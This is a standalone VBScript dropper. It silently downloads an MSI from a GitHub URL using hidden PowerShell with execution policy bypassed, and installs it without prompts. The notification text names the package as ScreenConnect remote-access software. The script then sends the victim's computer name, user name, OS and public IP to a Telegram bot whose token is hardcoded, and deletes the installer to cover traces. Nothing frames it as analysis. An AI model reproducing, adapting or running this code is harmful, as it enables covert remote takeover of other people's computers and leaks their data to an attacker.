' ================== CONFIG ==================
Dim BOT_TOKEN, CHAT_ID, PACKAGE_URL, TEMP_PATH, TEMP_DIR

BOT_TOKEN   = "8643735125:AAHi9ESDyzDDu9veWr7mM7GCIPaYwxxOpTo"
CHAT_ID     = "8345342738"
PACKAGE_URL = "https://github.com/Brayan-277/me/raw/refs/heads/main/me.msi"

TEMP_DIR  = "C:\Temp"
TEMP_PATH = TEMP_DIR & "\sc.msi"

' ================== OBJECTS ==================
Dim objShell, objFSO, intReturn
Set objShell = CreateObject("WScript.Shell")
Set objFSO   = CreateObject("Scripting.FileSystemObject")

' ================== CREATE TEMP DIR ==================
If Not objFSO.FolderExists(TEMP_DIR) Then
    objFSO.CreateFolder TEMP_DIR
End If

' ================== CLEAN OLD FILES ==================
Dim oldFiles, f
oldFiles = Array(TEMP_DIR & "\sc.msi", TEMP_DIR & "\patch.msi")

For Each f In oldFiles
    If objFSO.FileExists(f) Then
        objFSO.DeleteFile f, True
    End If
Next

' ================== DOWNLOAD MSI ==================
Dim downloadCmd
downloadCmd = _
    "powershell -NoProfile -ExecutionPolicy Bypass -Command " & _
    """[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" & _
    "(New-Object Net.WebClient).DownloadFile('" & PACKAGE_URL & "','" & TEMP_PATH & "')"""

intReturn = objShell.Run(downloadCmd, 0, True)

If Not objFSO.FileExists(TEMP_PATH) Then
    WScript.Quit 1
End If

' ================== INSTALL MSI ==================
Dim installCmd
installCmd = "msiexec.exe /i """ & TEMP_PATH & """ /qn /norestart"

intReturn = objShell.Run(installCmd, 0, True)

' ================== TELEGRAM NOTIFICATION ==================
Dim notifyCmd
notifyCmd = _
    "powershell -NoProfile -ExecutionPolicy Bypass -Command " & _
    """[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" & _
    "$ip=(Invoke-RestMethod 'https://api.ipify.org');" & _
    "$os=(Get-CimInstance Win32_OperatingSystem).Caption;" & _
    "$dt=Get-Date -Format 'yyyy-MM-dd HH:mm:ss';" & _
    "$msg='=== SCREENCONNECT INSTALLED ==='+[char]10+" & _
         "'PC: '+$env:COMPUTERNAME+[char]10+" & _
         "'User: '+$env:USERNAME+[char]10+" & _
         "'OS: '+$os+[char]10+" & _
         "'IP: '+$ip+[char]10+" & _
         "'Time: '+$dt;" & _
    "$body=@{chat_id='" & CHAT_ID & "';text=$msg};" & _
    "Invoke-RestMethod -Uri 'https://api.telegram.org/bot" & BOT_TOKEN & "/sendMessage' -Method Post -Body $body"""

objShell.Run notifyCmd, 0, False

' ================== CLEANUP ==================
If objFSO.FileExists(TEMP_PATH) Then
    objFSO.DeleteFile TEMP_PATH, True
End If
